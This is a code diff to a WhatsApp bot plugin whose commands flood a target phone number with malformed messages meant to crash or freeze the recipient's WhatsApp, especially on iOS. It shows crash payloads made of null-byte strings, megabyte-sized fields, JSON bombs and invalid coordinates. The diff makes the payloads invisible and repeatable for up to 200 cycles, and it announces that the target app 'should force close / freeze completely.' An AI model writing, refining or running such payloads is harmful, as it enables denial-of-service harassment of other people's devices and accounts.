@@ -18,15 +18,15 @@ async function getImageBuffer(url) {
 
 function getTarget(args, from, reply, cmdName) {
     if (!args || !args[0]) {
-        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
+        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [repeat_count]\nExample: .${cmdName} 94712345678 30`);
         return null;
     }
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== iOS CRASH FUNCTIONS (all fixed) ====================
+// ==================== iOS CRASH FUNCTIONS (ALL FIXED & INVISIBLE) ====================
 
-// 1. NexusLightUiDelay – image with embedded music + massive mentions
+// 1. NexusLightUiDelay – image with embedded music + massive mentions (invisible caption)
 async function nexusLightUiDelay(conn, target) {
     const generateMessage = {
         viewOnceMessage: {
@@ -34,11 +34,10 @@ async function nexusLightUiDelay(conn, target) {
                 imageMessage: {
                     url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                     mimetype: "image/jpeg",
-                    caption: "t.me/FinzzModzz",
+                    caption: "\u2060".repeat(100000), // invisible caption
                     fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                     fileLength: "19769",
-                    height: 354,
-                    width: 783,
+                    height: 354, width: 783,
                     mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                     fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                     directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
@@ -84,13 +83,13 @@ async function nexusLightUiDelay(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// 2. IosInvisibleForce – malformed location with massive null bytes
+// 2. IosInvisibleForce – malformed location with massive null bytes (invisible name)
 async function iosInvisibleForce(conn, target) {
     const msg = {
         locationMessage: {
             degreesLatitude: 21.1266,
             degreesLongitude: -11.8199,
-            name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
+            name: "\u2060".repeat(100000), // invisible name
             url: "https://t.me/rizxvelzdev",
             contextInfo: {
                 externalAdReply: {
@@ -98,7 +97,7 @@ async function iosInvisibleForce(conn, target) {
                         advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                         mediaType: "IMAGE",
                         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                        caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
+                        caption: "\u2063".repeat(50000) // invisible caption
                     },
                     placeholderKey: {
                         remoteJid: "0s.whatsapp.net",
@@ -112,13 +111,13 @@ async function iosInvisibleForce(conn, target) {
     await conn.relayMessage(target, msg, {});
 }
 
-// 3. DelayNative – interactive response with 1MB null bytes
+// 3. DelayNative – interactive response with 1MB null bytes (invisible body)
 async function delayNative(conn, target) {
     const message = {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "!", format: "DEFAULT" },
+                    body: { text: "\u2060".repeat(1000), format: "DEFAULT" }, // invisible
                     nativeFlowResponseMessage: {
                         name: "call_permission_message",
                         paramsJson: "\x10".repeat(1000000),
@@ -132,7 +131,7 @@ async function delayNative(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// 4. VerloadFcVisibleV1 – interactive with JSON bomb and extra location message
+// 4. VerloadFcVisibleV1 – interactive with JSON bomb and extra location (invisible text)
 async function verloadFcVisibleV1(conn, target) {
     const venomModsData = JSON.stringify({
         status: true, criador: "VenomMods", resultado: {
@@ -144,13 +143,13 @@ async function verloadFcVisibleV1(conn, target) {
         viewOnceMessage: {
             message: {
                 interactiveMessage: {
-                    header: { title: "You're beautiful៚", hasMediaAttachment: false },
-                    body: { text: "You're beautiful៚" },
+                    header: { title: "\u2060".repeat(1000), hasMediaAttachment: false },
+                    body: { text: "\u2063".repeat(5000) },
                     nativeFlowMessage: {
                         messageParamsJson: "",
                         buttons: [
                             { name: "single_select", buttonParamsJson: venomModsData + "\u0000" },
-                            { name: "call_permission_request", buttonParamsJson: venomModsData + "You're beautiful៚" }
+                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u2060".repeat(1000) }
                         ]
                     }
                 }
@@ -159,22 +158,22 @@ async function verloadFcVisibleV1(conn, target) {
     }, {});
     await conn.relayMessage(target, msg1.message, { participant: { jid: target } });
 
-    // Second part: location interactive
+    // Second part: location interactive with invisible text
     const msg2 = {
         viewOnceMessage: {
             message: {
                 interactiveMessage: {
                     header: {
-                        title: "VaxzyIsHere៚",
+                        title: "\u2060".repeat(10000),
                         hasMediaAttachment: false,
                         locationMessage: {
                             degreesLatitude: -999.03499999999999,
                             degreesLongitude: 922.999999999999,
-                            name: "VaxzyIsHere៚".repeat(10000),
-                            address: "ោ៝".repeat(10000)
+                            name: "\u2063".repeat(10000),
+                            address: "\u2060".repeat(10000)
                         }
                     },
-                    body: { text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #` },
+                    body: { text: "\u2060".repeat(5000) },
                     nativeFlowMessage: {
                         messageParamsJson: "{".repeat(10000),
                         buttons: Array(6).fill().map(() => ({ name: Math.random() > 0.5 ? "mpm" : "single_select", buttonParamsJson: "" }))
@@ -191,16 +190,16 @@ async function verloadFcVisibleV1(conn, target) {
             message: {
                 interactiveMessage: {
                     header: {
-                        title: "VaxzyNotWhyy👀",
+                        title: "\u2060".repeat(5000),
                         hasMediaAttachment: false,
                         locationMessage: {
                             degreesLatitude: -999.03499999999999,
                             degreesLongitude: 922.999999999999,
-                            name: "VaxzyNotWhyy👀".repeat(10000),
-                            address: "ោ៝".repeat(10000)
+                            name: "\u2063".repeat(10000),
+                            address: "\u2060".repeat(10000)
                         }
                     },
-                    body: { text: "VaxzyNotWhyy👀" },
+                    body: { text: "\u2060".repeat(2000) },
                     nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
                     contextInfo: { participant: target, mentionedJid: ["0@s.whatsapp.net"] }
                 }
@@ -210,13 +209,13 @@ async function verloadFcVisibleV1(conn, target) {
     await conn.relayMessage(target, msg3, { participant: { jid: target } });
 }
 
-// 5. galaxy_invisible – interactive response with 1MB nulls + massive mentions
+// 5. galaxy_invisible – interactive response with 1MB nulls + massive mentions (invisible)
 async function galaxyInvisible(conn, target) {
     const msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "@null", format: "DEFAULT" },
+                    body: { text: "\u2060".repeat(1000), format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "galaxy_message",
                         paramsJson: "\u0000".repeat(1000000),
@@ -229,10 +228,10 @@ async function galaxyInvisible(conn, target) {
                         ],
                         externalAdReply: {
                             quotedAd: {
-                                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
+                                advertiserName: "\u2063".repeat(50000),
                                 mediaType: "IMAGE",
                                 jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                                caption: `@rizxvelzinfinity${"𑇂𑆵𑆴𑆿".repeat(60000)}`
+                                caption: "\u2060".repeat(50000)
                             },
                             placeholderKey: {
                                 remoteJid: "0s.whatsapp.net",
@@ -248,21 +247,21 @@ async function galaxyInvisible(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// 6. CrashLoadIos – location message with extreme name (simplified)
+// 6. CrashLoadIos – location message with extreme name (invisible)
 async function crashLoadIos(conn, target) {
     const locationMsg = {
         locationMessage: {
             degreesLatitude: 21.1266,
             degreesLongitude: -11.8199,
-            name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
+            name: "\u2060".repeat(100000),
             url: "https://t.me/rizxvelzdev",
             contextInfo: {
                 externalAdReply: {
                     quotedAd: {
-                        advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
+                        advertiserName: "\u2063".repeat(50000),
                         mediaType: "IMAGE",
                         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                        caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
+                        caption: "\u2060".repeat(50000)
                     },
                     placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
                 }
@@ -272,13 +271,13 @@ async function crashLoadIos(conn, target) {
     await conn.relayMessage(target, locationMsg, { participant: { jid: target } });
 }
 
-// 7. Additional: DelayMention (status mention with protocol message) – from delay-mention.js
+// 7. DelayMention – interactive response (invisible)
 async function delayMention(conn, target) {
     const message = {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
-                    body: { text: "!", format: "DEFAULT" },
+                    body: { text: "\u2060".repeat(500), format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "call_permission_message",
                         paramsJson: "\x10".repeat(1000000),
@@ -290,11 +289,10 @@ async function delayMention(conn, target) {
     };
     const msg = generateWAMessageFromContent(target, message, {});
     await conn.relayMessage(target, msg.message, {});
-    // optional: send status mention (but needs proper key, skip to avoid errors)
 }
 
-// ==================== COMBO iOS CRASH ====================
-async function iosComboCrash(conn, target) {
+// ==================== iOS COMBO CRASH (REPEATABLE & INFINITE) ====================
+async function iosComboCrash(conn, target, repeat = 20) {
     const modules = [
         nexusLightUiDelay,
         iosInvisibleForce,
@@ -304,22 +302,24 @@ async function iosComboCrash(conn, target) {
         crashLoadIos,
         delayMention
     ];
-    for (const mod of modules) {
-        try {
-            await mod(conn, target);
-            await new Promise(r => setTimeout(r, 200)); // small gap to avoid rate limits
-        } catch (err) {
-            console.error(`iOS module ${mod.name} failed:`, err.message);
+    for (let r = 0; r < repeat; r++) {
+        for (const mod of modules) {
+            try {
+                await mod(conn, target);
+                await new Promise(resolve => setTimeout(resolve, 100));
+            } catch (err) {
+                console.error(`iOS module failed:`, err.message);
+            }
         }
     }
 }
 
-// ==================== OTHER EXISTING COMMANDS (keep working) ====================
+// ==================== OTHER EXISTING COMMANDS (unchanged but kept) ====================
 async function sendProduct(conn, target) {
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg", fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
-        fileLength: "93217", caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
+        fileLength: "93217", caption: "\u2060".repeat(100000),
         height: 1080, width: 1080, mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
         fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
         directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
@@ -337,8 +337,8 @@ async function sendProduct(conn, target) {
                 productMessage: {
                     product: {
                         productImage: imageMessage, productId: "449756950375071",
-                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
-                        description: "MY Bad" + "\u2060".repeat(60000),
+                        title: "\u2060".repeat(50000),
+                        description: "\u2063".repeat(50000),
                         priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                         url: "wa.me/status", productImageCount: 9999999, firstImageId: "9999999999",
                         salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
@@ -356,7 +356,7 @@ async function sendLocation(conn, target) {
             message: {
                 liveLocationMessage: {
                     degreesLatitude: "p".repeat(50000), degreesLongitude: "p".repeat(50000),
-                    caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
+                    caption: "\u2060".repeat(80000),
                     sequenceNumber: "0", jpegThumbnail: ""
                 }
             }
@@ -381,7 +381,6 @@ async function sendSticker(conn, target) {
 
 async function massiveAttack(conn, target, cycles) {
     for (let cycle = 1; cycle <= cycles; cycle++) {
-        console.log(`🔥 Cycle ${cycle}/${cycles} for ${target}`);
         for (let i = 0; i < 100; i++) {
             await sendProduct(conn, target);
             await sendLocation(conn, target);
@@ -493,17 +492,20 @@ cmd({
 
 cmd({
     pattern: "ios-crash",
-    desc: "🍏 iOS COMBO CRASH – 7 iOS‑specific payloads (iPhone/iPad crash)",
+    desc: "🍏 iOS COMBO CRASH – 7 iOS payloads, repeatable & invisible",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply, args }) => {
     const target = getTarget(args, from, reply, "ios-crash");
     if (!target) return;
-    await reply(`🍏 *SHAVIYA XMD iOS COMBO CRASH* → ${target}\n_Firing 7 iOS crash modules..._\n_This may take 10-15 seconds._`);
+    let repeat = parseInt(args[1]);
+    if (isNaN(repeat) || repeat < 1) repeat = 20;
+    if (repeat > 200) repeat = 200;
+    await reply(`🍏 *SHAVIYA XMD iOS COMBO CRASH* → ${target}\n_Firing 7 iOS modules, ${repeat} cycles each (total ${repeat*7} payloads)..._\n_This may take a while._`);
     try {
-        await iosComboCrash(conn, target);
+        await iosComboCrash(conn, target, repeat);
         const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
-        const caption = `✅ iOS COMBO CRASH DELIVERED → ${target}\n⚠️ *Target iOS WhatsApp should force close / freeze completely.*`;
+        const caption = `✅ iOS COMBO CRASH DELIVERED → ${target}\n⚠️ *Target iOS WhatsApp should force close / freeze completely.*\n📊 *${repeat*7} invisible payloads sent.*`;
         if (successImg) await conn.sendMessage(from, { image: successImg, caption });
         else await reply(caption);
     } catch (err) {
@@ -518,7 +520,7 @@ cmd({
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply }) => {
-    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] [cycles] – 💀 Massive flood (300+ msgs/cycle)*\n*│ 📌 .shavi-invis – 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard – 💀 Extreme sticker bomb*\n*│ 📌 .ios-crash [number] – 🍏 iOS combo crash (7 payloads)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678 50\n> .ios-crash 94712345678\n> ⚠️ *Extreme power – use only on numbers you own.*`;
+    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] [cycles] – 💀 Massive flood (300+ msgs/cycle)*\n*│ 📌 .shavi-invis – 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard – 💀 Extreme sticker bomb*\n*│ 📌 .ios-crash [number] [repeat] – 🍏 iOS combo (7 payloads, repeatable)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678 50\n> .ios-crash 94712345678 30\n> ⚠️ *Extreme power – use only on numbers you own.*`;
     const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
     if (menuImg) {
         await conn.sendMessage(from, { image: menuImg, caption: menuText });
